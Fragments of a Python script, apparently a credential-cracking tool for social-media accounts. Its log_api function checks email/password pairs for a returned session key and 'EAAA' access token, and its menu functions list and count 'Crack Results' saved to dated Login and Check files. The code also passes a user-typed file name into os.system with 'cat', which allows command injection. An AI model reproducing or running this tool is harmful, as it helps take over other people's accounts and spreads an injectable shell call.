...
def log_api(em,pas,hosts):
    ...
    if 'session_key' in response.text and 'EAAA' in response.text:
        ...
        return {"status":"check","email":em,"pass":pas}
...
def hasil():
    ...
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sCheck Result Login '%(O,P,O,P))
    print('%s╠══[%s2%s] %sCheck result Check'%(O,P,O,P))
    ...
    if ch in ['']:
        ...
        try:
            okl = os.listdir("Login")
            print('%s║'%(O))
            print('%s╠══[%s Crack Results Stored in File Login%s]'%(O,P,O))
            print('%s║'%(O))
            for file in okl:
        ...
        try:
            cpl = os.listdir("Check")
            print('%s║'%(O))
            print('%s╠══[%s Crack Results Stored in Check Files %s]'%(O,P,O))
            print('%s║'%(O))
            for file in cpl:
                print('%s╠══[%s•%s] %s%s'%(O,P,O,P,file))
            print('%s║'%(O))
            ...
            if files == "":
                jalan('%s═══[%s!%s] %sCorrect Content'%(M,P,M,P))
                hasil()
            os.system('cat Check/%s'%(files))
            ppp = open("Check/%s"%(files)).read().splitlines()
            del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
            print('\n%s╔══[%s•%s] %sTotal Crack Result Date %s is %s Account'%(O,P,O,P,del1,len(ppp)))
        except (KeyError,IOError):
            print('%s╠══[%s No Results Found %s]'%(M,P,M))
...
def cek_hasil():
    ...
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sExample File : Check/%s.txt'%(O,P,O,P,tanggal))
...
def started():
    ...
    print('%s╠══[%s•%s] %sAccount [Login] Saved To Login/%s.txt'%(O,P,O,P,tanggal))
    print('%s╠══[%s•%s] %sAccount [Check] Saved To Check/%s.txt'%(O,P,O,P,tanggal))
